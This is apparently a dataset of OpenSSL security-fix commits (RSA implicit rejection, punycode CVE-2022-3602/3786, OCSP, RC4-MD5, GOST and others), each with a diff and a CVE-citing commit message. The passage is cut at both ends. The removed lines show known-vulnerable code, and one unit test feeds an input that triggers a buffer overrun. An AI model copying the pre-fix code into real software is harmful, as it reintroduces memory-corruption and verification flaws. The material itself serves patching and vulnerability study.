    \ * (int)sizeof(len_candidate);\n+            i += sizeof(len_candidate)) {\n\
    +        len_candidate = (candidate_lengths[i] << 8) | candidate_lengths[i + 1];\n\
    +        len_candidate &= len_mask;\n+\n+        synthethic_length = constant_time_select_int(\n\
    +            constant_time_lt(len_candidate, max_sep_offset),\n+            len_candidate,\
    \ synthethic_length);\n+    }\n+\n+    synth_msg_index = flen - synthethic_length;\n\
    +\n+    /* we have alternative message ready, check the real one */\n+    good\
    \ = constant_time_is_zero(from[0]);\n+    good &= constant_time_eq(from[1], 2);\n\
    +\n+    /* then look for the padding|message separator (the first zero byte) */\n\
    +    found_zero_byte = 0;\n+    for (i = 2; i < flen; i++) {\n+        unsigned\
    \ int equals0 = constant_time_is_zero(from[i]);\n+        zero_index = constant_time_select_int(~found_zero_byte\
    \ & equals0,\n+                                              i, zero_index);\n\
    +        found_zero_byte |= equals0;\n+    }\n+\n+    /*\n+     * padding must\
    \ be at least 8 bytes long, and it starts two bytes into\n+     * |from|. If we\
    \ never found a 0-byte, then |zero_index| is 0 and the check\n+     * also fails.\n\
    +     */\n+    good &= constant_time_ge(zero_index, 2 + 8);\n+\n+    /*\n+   \
    \  * Skip the zero byte. This is incorrect if we never found a zero-byte\n+  \
    \   * but in this case we also do not copy the message out.\n+     */\n+    msg_index\
    \ = zero_index + 1;\n+\n+    /*\n+     * old code returned an error in case the\
    \ decrypted message wouldn't fit\n+     * into the |to|, since that would leak\
    \ information, return the synthethic\n+     * message instead\n+     */\n+   \
    \ good &= constant_time_ge(tlen, num - msg_index);\n+\n+    msg_index = constant_time_select_int(good,\
    \ msg_index, synth_msg_index);\n+\n+    /*\n+     * since at this point the |msg_index|\
    \ does not provide the signal\n+     * indicating if the padding check failed\
    \ or not, we don't have to worry\n+     * about leaking the length of returned\
    \ message, we still need to ensure\n+     * that we read contents of both buffers\
    \ so that cache accesses don't leak\n+     * the value of |good|\n+     */\n+\
    \    for (i = msg_index, j = 0; i < flen && j < tlen; i++, j++)\n+        to[j]\
    \ = constant_time_select_8(good, from[i], synthetic[i]);\n+    ret = j;\n+\n+err:\n\
    +    /*\n+     * the only time ret < 0 is when the ciphertext is publicly invalid\n\
    +     * or we were called with invalid parameters, so we don't have to perform\n\
    +     * a side-channel secure raising of the error\n+     */\n+    if (ret < 0)\n\
    +        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+    OPENSSL_free(synthetic);\n\
    +    return ret;\n+}\n+\n /*\n  * ossl_rsa_padding_check_PKCS1_type_2_TLS() checks\
    \ and removes the PKCS1 type 2\n  * padding from a decrypted RSA message in a\
    \ TLS signature. The result is stored"
  commit_message: 'rsa: add implicit rejection in PKCS#1 v1.5


    The RSA decryption as implemented before required very careful handling

    of both the exit code returned by OpenSSL and the potentially returned

    ciphertext. Looking at the recent security vulnerabilities

    (CVE-2020-25659 and CVE-2020-25657) it is unlikely that most users of

    OpenSSL do it correctly.


    Given that correct code requires side channel secure programming in

    application code, we can classify the existing RSA decryption methods

    as CWE-676, which in turn likely causes CWE-208 and CWE-385 in

    application code.


    To prevent that, we can use a technique called "implicit rejection".

    For that we generate a random message to be returned in case the

    padding check fails. We generate the message based on static secret

    data (the private exponent) and the provided ciphertext (so that the

    attacker cannot determine that the returned value is randomly generated

    instead of result of decryption and de-padding). We return it in case

    any part of padding check fails.


    The upshot of this approach is that then not only is the length of the

    returned message useless as the Bleichenbacher oracle, so are the

    actual bytes of the returned message. So application code doesn''t have

    to perform any operations on the returned message in side-channel free

    way to remain secure against Bleichenbacher attacks.


    Note: this patch implements a specific algorithm, shared with Mozilla

    NSS, so that the attacker cannot use one library as an oracle against the

    other in heterogeneous environments.


    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Tim Hudson <tjh@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/13817)'
  commit_sha: 7fc67e0a33102aa47bbaa56533eeecb98c0450f7
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/pcy_map.c\n+++ b/crypto/x509/pcy_map.c\n@@ -73,10 +73,6 @@\
    \ int ossl_policy_cache_set_mapping(X509 *x, POLICY_MAPPINGS *maps)\n \n     ret\
    \ = 1;\n  bad_mapping:\n-    if (ret == -1 && CRYPTO_THREAD_write_lock(x->lock))\
    \ {\n-        x->ex_flags |= EXFLAG_INVALID_POLICY;\n-        CRYPTO_THREAD_unlock(x->lock);\n\
    -    }\n     sk_POLICY_MAPPING_pop_free(maps, POLICY_MAPPING_free);\n     return\
    \ ret;\n "
  commit_message: 'x509: fix double locking problem


    This reverts commit 9aa4be691f5c73eb3c68606d824c104550c053f7 and removed the

    redundant flag setting.


    Fixes #19643


    Fixes LOW CVE-2022-3996


    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19652)'
  commit_sha: 4d0340a6d2f327700a059f0b8f954d6160f8eef5
  repo_name: openssl/openssl
- commit_diff:
  - '--- a/test/punycode_test.c

    +++ b/test/punycode_test.c

    @@ -0,0 +1,220 @@

    +/*

    + * Copyright 2022 The OpenSSL Project Authors. All Rights Reserved.

    + *

    + * Licensed under the Apache License 2.0 (the "License").  You may not use

    + * this file except in compliance with the License.  You can obtain a copy

    + * in the file LICENSE in the source distribution or at

    + * https://www.openssl.org/source/license.html

    + */

    +

    +#include <openssl/crypto.h>

    +#include <string.h>

    +

    +#include "crypto/punycode.h"

    +#include "internal/nelem.h"

    +#include "testutil.h"

    +

    +

    +static const struct puny_test {

    +    unsigned int raw[50];

    +    const char *encoded;

    +} puny_cases[] = {

    +    /* Test cases from RFC 3492 */

    +    {   /* Arabic (Egyptian) */

    +        { 0x0644, 0x064A, 0x0647, 0x0645, 0x0627, 0x0628, 0x062A, 0x0643, 0x0644,

    +          0x0645, 0x0648, 0x0634, 0x0639, 0x0631, 0x0628, 0x064A, 0x061F

    +        },

    +        "egbpdaj6bu4bxfgehfvwxn"

    +    },

    +    {   /* Chinese (simplified) */

    +        { 0x4ED6, 0x4EEC, 0x4E3A, 0x4EC0, 0x4E48, 0x4E0D, 0x8BF4, 0x4E2D, 0x6587

    +        },

    +        "ihqwcrb4cv8a8dqg056pqjye"

    +    },

    +    {   /* Chinese (traditional) */

    +        { 0x4ED6, 0x5011, 0x7232, 0x4EC0, 0x9EBD, 0x4E0D, 0x8AAA, 0x4E2D, 0x6587

    +        },

    +        "ihqwctvzc91f659drss3x8bo0yb"

    +    },

    +    {    /* Czech: Pro<ccaron>prost<ecaron>nemluv<iacute><ccaron>esky */

    +        { 0x0050, 0x0072, 0x006F, 0x010D, 0x0070, 0x0072, 0x006F, 0x0073, 0x0074,

    +          0x011B, 0x006E, 0x0065, 0x006D, 0x006C, 0x0075, 0x0076, 0x00ED, 0x010D,

    +          0x0065, 0x0073, 0x006B, 0x0079

    +       },

    +        "Proprostnemluvesky-uyb24dma41a"

    +    },

    +    {   /* Hebrew */

    +        { 0x05DC, 0x05DE, 0x05D4, 0x05D4, 0x05DD, 0x05E4, 0x05E9, 0x05D5, 0x05D8,

    +          0x05DC, 0x05D0, 0x05DE, 0x05D3, 0x05D1, 0x05E8, 0x05D9, 0x05DD, 0x05E2,

    +          0x05D1, 0x05E8, 0x05D9, 0x05EA

    +        },

    +        "4dbcagdahymbxekheh6e0a7fei0b"

    +    },

    +    {   /* Hindi (Devanagari) */

    +        { 0x092F, 0x0939, 0x0932, 0x094B, 0x0917, 0x0939, 0x093F, 0x0928, 0x094D,

    +          0x0926, 0x0940, 0x0915, 0x094D, 0x092F, 0x094B, 0x0902, 0x0928, 0x0939,

    +          0x0940, 0x0902, 0x092C, 0x094B, 0x0932, 0x0938, 0x0915, 0x0924, 0x0947,

    +          0x0939, 0x0948, 0x0902

    +        },

    +        "i1baa7eci9glrd9b2ae1bj0hfcgg6iyaf8o0a1dig0cd"

    +    },

    +    {   /* Japanese (kanji and hiragana) */

    +        { 0x306A, 0x305C, 0x307F, 0x3093, 0x306A, 0x65E5, 0x672C, 0x8A9E, 0x3092,

    +          0x8A71, 0x3057, 0x3066, 0x304F, 0x308C, 0x306A, 0x3044, 0x306E, 0x304B

    +        },

    +        "n8jok5ay5dzabd5bym9f0cm5685rrjetr6pdxa"

    +    },

    +    {   /* Korean (Hangul syllables) */

    +        { 0xC138, 0xACC4, 0xC758, 0xBAA8, 0xB4E0, 0xC0AC, 0xB78C, 0xB4E4, 0xC774,

    +          0xD55C, 0xAD6D, 0xC5B4, 0xB97C, 0xC774, 0xD574, 0xD55C, 0xB2E4, 0xBA74,

    +          0xC5BC, 0xB9C8, 0xB098, 0xC88B, 0xC744, 0xAE4C

    +        },

    +        "989aomsvi5e83db1d2a355cv1e0vak1dwrv93d5xbh15a0dt30a5jpsd879ccm6fea98c"

    +    },

    +    {   /* Russian (Cyrillic) */

    +        { 0x043F, 0x043E, 0x0447, 0x0435, 0x043C, 0x0443, 0x0436, 0x0435, 0x043E,

    +          0x043D, 0x0438, 0x043D, 0x0435, 0x0433, 0x043E, 0x0432, 0x043E, 0x0440,

    +          0x044F, 0x0442, 0x043F, 0x043E, 0x0440, 0x0443, 0x0441, 0x0441, 0x043A,

    +          0x0438

    +        },

    +        "b1abfaaepdrnnbgefbaDotcwatmq2g4l"

    +    },

    +    {   /* Spanish */

    +        { 0x0050, 0x006F, 0x0072, 0x0071, 0x0075, 0x00E9, 0x006E, 0x006F, 0x0070,

    +          0x0075, 0x0065, 0x0064, 0x0065, 0x006E, 0x0073, 0x0069, 0x006D, 0x0070,

    +          0x006C, 0x0065, 0x006D, 0x0065, 0x006E, 0x0074, 0x0065, 0x0068, 0x0061,

    +          0x0062, 0x006C, 0x0061, 0x0072, 0x0065, 0x006E, 0x0045, 0x0073, 0x0070,

    +          0x0061, 0x00F1, 0x006F, 0x006C

    +        },

    +        "PorqunopuedensimplementehablarenEspaol-fmd56a"

    +    },

    +    {   /* Vietnamese */

    +        { 0x0054, 0x1EA1, 0x0069, 0x0073, 0x0061, 0x006F, 0x0068, 0x1ECD, 0x006B,

    +          0x0068, 0x00F4, 0x006E, 0x0067, 0x0074, 0x0068, 0x1EC3, 0x0063, 0x0068,

    +          0x1EC9, 0x006E, 0x00F3, 0x0069, 0x0074, 0x0069, 0x1EBF, 0x006E, 0x0067,

    +          0x0056, 0x0069, 0x1EC7, 0x0074

    +        },

    +        "TisaohkhngthchnitingVit-kjcr8268qyxafd2f1b9g"

    +    },

    +    {   /* Japanese: 3<nen>B<gumi><kinpachi><sensei> */

    +        { 0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, 0x751F

    +        },

    +        "3B-ww4c5e180e575a65lsy2b"

    +    },

    +    {   /* Japanese: <amuro><namie>-with-SUPER-MONKEYS */

    +        { 0x5B89, 0x5BA4, 0x5948, 0x7F8E, 0x6075, 0x002D, 0x0077, 0x0069, 0x0074,

    +          0x0068, 0x002D, 0x0053, 0x0055, 0x0050, 0x0045, 0x0052, 0x002D, 0x004D,

    +          0x004F, 0x004E, 0x004B, 0x0045, 0x0059, 0x0053

    +        },

    +        "-with-SUPER-MONKEYS-pc58ag80a8qai00g7n9n"

    +    },

    +    {   /* Japanese: Hello-Another-Way-<sorezore><no><basho> */

    +        { 0x0048, 0x0065, 0x006C, 0x006C, 0x006F, 0x002D, 0x0041, 0x006E, 0x006F,

    +          0x0074, 0x0068, 0x0065, 0x0072, 0x002D, 0x0057, 0x0061, 0x0079, 0x002D,

    +          0x305D, 0x308C, 0x305E, 0x308C, 0x306E, 0x5834, 0x6240

    +        },

    +        "Hello-Another-Way--fc4qua05auwb3674vfr0b"

    +    },

    +    {   /* Japanese: <hitotsu><yane><no><shita>2 */

    +        { 0x3072, 0x3068, 0x3064, 0x5C4B, 0x6839, 0x306E, 0x4E0B, 0x0032

    +        },

    +        "2-u9tlzr9756bt3uc0v"

    +    },

    +    {   /* Japanese: Maji<de>Koi<suru>5<byou><mae> */

    +        { 0x004D, 0x0061, 0x006A, 0x0069, 0x3067, 0x004B, 0x006F, 0x0069, 0x3059,

    +          0x308B, 0x0035, 0x79D2, 0x524D

    +        },

    +        "MajiKoi5-783gue6qz075azm5e"

    +    },

    +    {   /* Japanese: <pafii>de<runba> */

    +        { 0x30D1, 0x30D5, 0x30A3, 0x30FC, 0x0064, 0x0065, 0x30EB, 0x30F3, 0x30D0

    +        },

    +        "de-jg4avhby1noc0d"

    +    },

    +    {   /* Japanese: <sono><supiido><de> */

    +        { 0x305D, 0x306E, 0x30B9, 0x30D4, 0x30FC, 0x30C9, 0x3067

    +        },

    +        "d9juau41awczczp"

    +    },

    +    {   /* -> $1.00 <- */

    +        { 0x002D, 0x003E, 0x0020, 0x0024, 0x0031, 0x002E, 0x0030, 0x0030, 0x0020,

    +          0x003C, 0x002D

    +        },

    +        "-> $1.00 <--"

    +    }

    +};

    +

    +static int test_punycode(int n)

    +{

    +    const struct puny_test *tc = puny_cases + n;

    +    unsigned int buffer[50];

    +    unsigned int bsize = OSSL_NELEM(buffer);

    +    size_t i;

    +

    +    if (!TEST_true(ossl_punycode_decode(tc->encoded, strlen(tc->encoded),

    +                                        buffer, &bsize)))

    +        return 0;

    +    for (i = 0; i < sizeof(tc->raw); i++)

    +        if (tc->raw[i] == 0)

    +            break;

    +    if (!TEST_mem_eq(buffer, bsize * sizeof(*buffer),

    +                     tc->raw, i * sizeof(*tc->raw)))

    +        return 0;

    +    return 1;

    +}

    +

    +static int test_a2ulabel(void)

    +{

    +    char out[50];

    +    size_t outlen;

    +

    +    /*

    +     * Test that no buffer correctly returns the true length.

    +     * The punycode being passed in and parsed is malformed but we''re not

    +     * verifying that behaviour here.

    +     */

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", NULL, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1))

    +        return 0;

    +    /* Test that a short input length returns the true length */

    +    outlen = 1;

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1)

    +            || !TEST_str_eq(out,"\xc2\x80.b.c"))

    +        return 0;

    +    /* Test for an off by one on the buffer size works */

    +    outlen = 6;

    +    if (!TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 0)

    +            || !TEST_size_t_eq(outlen, 7)

    +            || !TEST_int_eq(ossl_a2ulabel("xn--a.b.c", out, &outlen), 1)

    +            || !TEST_str_eq(out,"\xc2\x80.b.c"))

    +        return 0;

    +    return 1;

    +}

    +

    +static int test_puny_overrun(void)

    +{

    +    static const unsigned int out[] = {

    +        0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, 0x751F

    +    };

    +    static const char *in = "3B-ww4c5e180e575a65lsy2b";

    +    unsigned int buf[OSSL_NELEM(out)];

    +    unsigned int bsize = OSSL_NELEM(buf) - 1;

    +

    +    if (!TEST_false(ossl_punycode_decode(in, strlen(in), buf, &bsize))) {

    +        if (TEST_mem_eq(buf, bsize * sizeof(*buf), out, sizeof(out)))

    +            TEST_error("CRITICAL: buffer overrun detected!");

    +        return 0;

    +    }

    +    return 1;

    +}

    +

    +int setup_tests(void)

    +{

    +    ADD_ALL_TESTS(test_punycode, OSSL_NELEM(puny_cases));

    +    ADD_TEST(test_a2ulabel);

    +    ADD_TEST(test_puny_overrun);

    +    return 1;

    +}'
  commit_message: 'punycode: add unit tests


    These tests verify basic functionality and specifically test for

    CVE-2022-3602.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit f0f530216bf93e9cdc9c2c9e3c095229d216da15)'
  commit_sha: a0af4a3c8b18c435a5a4afb28b3ad1a2730e6ea8
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/punycode.c\n+++ b/crypto/punycode.c\n@@ -185,7 +184,7 @@ int ossl_punycode_decode(const\
    \ char *pEncoded, const size_t enc_len,\n             return 0;\n \n         memmove(pDecoded\
    \ + i + 1, pDecoded + i,\n-                (written_out - i) * sizeof *pDecoded);\n\
    +                (written_out - i) * sizeof(*pDecoded));\n         pDecoded[i]\
    \ = n;\n         i++;\n         written_out++;\n@@ -255,65 +254,61 @@ int ossl_a2ulabel(const\
    \ char *in, char *out, size_t *outlen)\n      */\n     char *outptr = out;\n \
    \    const char *inptr = in;\n-    size_t size = 0;\n+    size_t size = 0, maxsize;\n\
    \     int result = 1;\n-\n+    unsigned int i, j;\n     unsigned int buf[LABEL_BUF_SIZE];\
    \      /* It's a hostname */\n-    if (out == NULL)\n+\n+    if (out == NULL)\
    \ {\n         result = 0;\n+        maxsize = 0;\n+    } else {\n+        maxsize\
    \ = *outlen;\n+    }\n+\n+#define PUSHC(c)                    \\\n+    do    \
    \                          \\\n+        if (size++ < maxsize)       \\\n+    \
    \        *outptr++ = c;          \\\n+        else                        \\\n\
    +            result = 0;             \\\n+    while (0)\n \n     while (1) {\n\
    \         char *tmpptr = strchr(inptr, '.');\n-        size_t delta = (tmpptr)\
    \ ? (size_t)(tmpptr - inptr) : strlen(inptr);\n+        size_t delta = tmpptr\
    \ != NULL ? (size_t)(tmpptr - inptr) : strlen(inptr);\n \n         if (!HAS_PREFIX(inptr,\
    \ \"xn--\")) {\n-            size += delta + 1;\n-\n-            if (size >= *outlen\
    \ - 1)\n-                result = 0;\n-\n-            if (result > 0) {\n-   \
    \             memcpy(outptr, inptr, delta + 1);\n-                outptr += delta\
    \ + 1;\n-            }\n+            for (i = 0; i < delta + 1; i++)\n+      \
    \          PUSHC(inptr[i]);\n         } else {\n             unsigned int bufsize\
    \ = LABEL_BUF_SIZE;\n-            unsigned int i;\n \n             if (ossl_punycode_decode(inptr\
    \ + 4, delta - 4, buf, &bufsize) <= 0)\n                 return -1;\n \n     \
    \        for (i = 0; i < bufsize; i++) {\n                 unsigned char seed[6];\n\
    \                 size_t utfsize = codepoint2utf8(seed, buf[i]);\n+\n        \
    \         if (utfsize == 0)\n                     return -1;\n \n-           \
    \     size += utfsize;\n-                if (size >= *outlen - 1)\n-         \
    \           result = 0;\n-\n-                if (result > 0) {\n-            \
    \        memcpy(outptr, seed, utfsize);\n-                    outptr += utfsize;\n\
    -                }\n+                for (j = 0; j < utfsize; j++)\n+        \
    \            PUSHC(seed[j]);\n             }\n \n-            if (tmpptr != NULL)\
    \ {\n-                *outptr = '.';\n-                outptr++;\n-          \
    \      size++;\n-                if (size >= *outlen - 1)\n-                 \
    \   result = 0;\n-            }\n+            PUSHC(tmpptr != NULL ? '.' : '\\\
    0');\n         }\n \n         if (tmpptr == NULL)\n             break;\n \n  \
    \       inptr = tmpptr + 1;\n     }\n+#undef PUSHC\n \n+    *outlen = size;\n\
    \     return result;\n }\n \n@@ -327,12 +322,11 @@ int ossl_a2ulabel(const char\
    \ *in, char *out, size_t *outlen)\n \n int ossl_a2ucompare(const char *a, const\
    \ char *u)\n {\n-    char a_ulabel[LABEL_BUF_SIZE];\n+    char a_ulabel[LABEL_BUF_SIZE\
    \ + 1];\n     size_t a_size = sizeof(a_ulabel);\n \n-    if (ossl_a2ulabel(a,\
    \ a_ulabel, &a_size) <= 0) {\n+    if (ossl_a2ulabel(a, a_ulabel, &a_size) <=\
    \ 0)\n         return -1;\n-    }\n \n-    return (strcmp(a_ulabel, u) == 0) ?\
    \ 0 : 1;\n+    return strcmp(a_ulabel, u) != 0;\n }"
  commit_message: 'Fix CVE-2022-3786 in punycode decoder.


    Fixed the ossl_a2ulabel() function which also contained a potential

    buffer overflow, albeit without control of the contents.

    This overflow could result in a crash (causing a denial of service).


    The function also did not NUL-terminate the output in some cases.


    The two issues fixed here were dentified and reported

    by Viktor Dukhovni while researching CVE-2022-3602.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit c42165b5706e42f67ef8ef4c351a9a4c5d21639a)'
  commit_sha: 680e65b94c916af259bfdc2e25f1ab6e0c7a97d6
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/punycode.c\n+++ b/crypto/punycode.c\n@@ -181,7 +181,7 @@ int ossl_punycode_decode(const\
    \ char *pEncoded, const size_t enc_len,\n         n = n + i / (written_out + 1);\n\
    \         i %= (written_out + 1);\n \n-        if (written_out > max_out)\n+ \
    \       if (written_out >= max_out)\n             return 0;\n \n         memmove(pDecoded\
    \ + i + 1, pDecoded + i,"
  commit_message: 'Fix CVE-2022-3602 in punycode decoder.


    An off by one error in the punycode decoder allowed for a single unsigned int

    overwrite of a buffer which could cause a crash and possible code execution.


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (cherry picked from commit fe3b639dc19b325846f4f6801f2f4604f56e3de3)'
  commit_sha: 3b421ebc64c7b52f1b9feb3812bdc7781c784332
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/digest.c\n+++ b/crypto/evp/digest.c\n@@ -230,11 +230,12 @@ static\
    \ int evp_md_init_internal(EVP_MD_CTX *ctx, const EVP_MD *type,\n # endif\n #endif\n\
    \             || (ctx->flags & EVP_MD_CTX_FLAG_NO_INIT) != 0\n-            ||\
    \ type->origin == EVP_ORIG_METH) {\n+            || (type != NULL && type->origin\
    \ == EVP_ORIG_METH)\n+            || (type == NULL && ctx->digest != NULL\n+ \
    \                            && ctx->digest->origin == EVP_ORIG_METH)) {\n   \
    \      /* If we were using provided hash before, cleanup algctx */\n         if\
    \ (!evp_md_ctx_free_algctx(ctx))\n             return 0;\n-\n         if (ctx->digest\
    \ == ctx->fetched_digest)\n             ctx->digest = NULL;\n         EVP_MD_free(ctx->fetched_digest);"
  - "--- a/crypto/evp/evp_enc.c\n+++ b/crypto/evp/evp_enc.c\n@@ -144,7 +144,10 @@\
    \ static int evp_cipher_init_internal(EVP_CIPHER_CTX *ctx,\n #if !defined(OPENSSL_NO_ENGINE)\
    \ && !defined(FIPS_MODULE)\n             || tmpimpl != NULL\n #endif\n-      \
    \      || impl != NULL) {\n+            || impl != NULL\n+            || (cipher\
    \ != NULL && cipher->origin == EVP_ORIG_METH)\n+            || (cipher == NULL\
    \ && ctx->cipher != NULL\n+                               && ctx->cipher->origin\
    \ == EVP_ORIG_METH)) {\n         if (ctx->cipher == ctx->fetched_cipher)\n   \
    \          ctx->cipher = NULL;\n         EVP_CIPHER_free(ctx->fetched_cipher);"
  commit_message: 'Fix usage of custom EVP_CIPHER objects


    If a custom EVP_CIPHER object has been passed to EVP_CipherInit() then it

    should be used in preference to a fetched cipher.


    We also fix a possible NULL pointer deref in the same code for digests.


    If the custom cipher passed to EVP_CipherInit() happens to use NID_undef

    (which should be a discouraged practice), then in the previous

    implementation this could result in the NULL cipher being fetched and

    hence NULL encryption being unexpectedly used.


    CVE-2022-3358


    Fixes #18970


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19300)'
  commit_sha: 25d47cccf203c3b71171e78865e48ea061a039a8
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/statem/statem_clnt.c\n+++ b/ssl/statem/statem_clnt.c\n@@ -3156,7 +3156,8\
    \ @@ static int tls_construct_cke_gost18(SSL *s, WPACKET *pkt)\n {\n #ifndef OPENSSL_NO_GOST\n\
    \     /* GOST 2018 key exchange message creation */\n-    unsigned char rnd_dgst[32],\
    \ tmp[255];\n+    unsigned char rnd_dgst[32];\n+    unsigned char *encdata = NULL;\n\
    \     EVP_PKEY_CTX *pkey_ctx = NULL;\n     X509 *peer_cert;\n     unsigned char\
    \ *pms = NULL;\n@@ -3221,18 +3222,19 @@ static int tls_construct_cke_gost18(SSL\
    \ *s, WPACKET *pkt)\n         goto err;\n     }\n \n-    msglen = 255;\n-    if\
    \ (EVP_PKEY_encrypt(pkey_ctx, tmp, &msglen, pms, pmslen) <= 0) {\n-        SSLfatal(s,\
    \ SSL_AD_INTERNAL_ERROR, SSL_R_LIBRARY_BUG);\n+    if (EVP_PKEY_encrypt(pkey_ctx,\
    \ NULL, &msglen, pms, pmslen) <= 0) {\n+        SSLfatal(s, SSL_AD_INTERNAL_ERROR,\
    \ ERR_R_EVP_LIB);\n         goto err;\n     }\n \n-    if (!WPACKET_memcpy(pkt,\
    \ tmp, msglen)) {\n-        SSLfatal(s, SSL_AD_INTERNAL_ERROR, ERR_R_INTERNAL_ERROR);\n\
    +    if (!WPACKET_allocate_bytes(pkt, msglen, &encdata)\n+            || EVP_PKEY_encrypt(pkey_ctx,\
    \ encdata, &msglen, pms, pmslen) <= 0) {\n+        SSLfatal(s, SSL_AD_INTERNAL_ERROR,\
    \ ERR_R_EVP_LIB);\n         goto err;\n     }\n \n     EVP_PKEY_CTX_free(pkey_ctx);\n\
    +    pkey_ctx = NULL;\n     s->s3.tmp.pms = pms;\n     s->s3.tmp.pmslen = pmslen;\n\
    \ "
  commit_message: 'Use safe pattern for buffer size determining in case of GOST key
    exchange


    Related: CVE-2022-29242


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/18381)'
  commit_sha: 2b5e89992e3ada1131beebb2a22722168b9389c2
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/ciphers/cipher_rc4_hmac_md5.c\n+++ b/providers/implementations/ciphers/cipher_rc4_hmac_md5.c\n\
    @@ -183,7 +183,7 @@ static int rc4_hmac_md5_set_ctx_params(void *vctx, const OSSL_PARAM\
    \ params[])\n         }\n         ctx->tls_aad_pad_sz = sz;\n     }\n-    p =\
    \ OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_AEAD_TLS1_AAD);\n+    p =\
    \ OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_AEAD_MAC_KEY);\n     if (p\
    \ != NULL) {\n         if (p->data_type != OSSL_PARAM_OCTET_STRING) {\n      \
    \       ERR_raise(ERR_LIB_PROV, PROV_R_FAILED_TO_GET_PARAMETER);"
  commit_message: 'Fix the RC4-MD5 cipher


    A copy&paste error meant that the RC4-MD5 cipher (used in TLS) used the TLS

    AAD data as the MAC key.


    CVE-2022-1434


    Fixes #18112


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 33219939c782cf363b30e9e899b9997fb1ced440
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ocsp/ocsp_vfy.c\n+++ b/crypto/ocsp/ocsp_vfy.c\n@@ -59,9 +59,10 @@\
    \ static int ocsp_verify_signer(X509 *signer, int response,\n \n     ret = X509_verify_cert(ctx);\n\
    \     if (ret <= 0) {\n-        ret = X509_STORE_CTX_get_error(ctx);\n+      \
    \  int err = X509_STORE_CTX_get_error(ctx);\n+\n         ERR_raise_data(ERR_LIB_OCSP,\
    \ OCSP_R_CERTIFICATE_VERIFY_ERROR,\n-                       \"Verify error: %s\"\
    , X509_verify_cert_error_string(ret));\n+                       \"Verify error:\
    \ %s\", X509_verify_cert_error_string(err));\n         goto end;\n     }\n   \
    \  if (chain != NULL)"
  commit_message: 'Fix OCSP_basic_verify signer certificate validation


    The function `OCSP_basic_verify` validates the signer certificate on an OCSP

    response. The internal function, ocsp_verify_signer, is responsible for this

    and is expected to return a 0 value in the event of a failure to verify.

    Unfortunately, due to a bug, it actually returns with a postive success

    response in this case. In the normal course of events OCSP_basic_verify

    will then continue and will fail anyway in the ocsp_check_issuer function

    because the supplied "chain" value will be empty in the case that

    ocsp_verify_signer failed to verify the chain. This will cause

    OCSP_basic_verify to return with a negative result (fatal error). Normally

    in the event of a failure to verify it should return with 0.


    However, in the case of the OCSP_NOCHECKS flag being used, OCSP_basic_verify

    will return with a positvie result. This could lead to callers trusting an

    OCSP Basic response when it should not be.


    CVE-2022-1343


    Fixes #18053


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 21f89f542d745adbf1131338929ae538e200d50d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_sqrt.c\n+++ b/crypto/bn/bn_sqrt.c\n@@ -14,7 +14,8 @@ BIGNUM\
    \ *BN_mod_sqrt(BIGNUM *in, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx)\n /*\n\
    \  * Returns 'ret' such that ret^2 == a (mod p), using the Tonelli/Shanks\n  *\
    \ algorithm (cf. Henri Cohen, \"A Course in Algebraic Computational Number\n-\
    \ * Theory\", algorithm 1.5.1). 'p' must be prime!\n+ * Theory\", algorithm 1.5.1).\
    \ 'p' must be prime, otherwise an error or\n+ * an incorrect \"result\" will be\
    \ returned.\n  */\n {\n     BIGNUM *ret = in;\n@@ -303,18 +304,23 @@ BIGNUM *BN_mod_sqrt(BIGNUM\
    \ *in, const BIGNUM *a, const BIGNUM *p, BN_CTX *ctx)\n             goto vrfy;\n\
    \         }\n \n-        /* find smallest  i  such that  b^(2^i) = 1 */\n-   \
    \     i = 1;\n-        if (!BN_mod_sqr(t, b, p, ctx))\n-            goto end;\n\
    -        while (!BN_is_one(t)) {\n-            i++;\n-            if (i == e)\
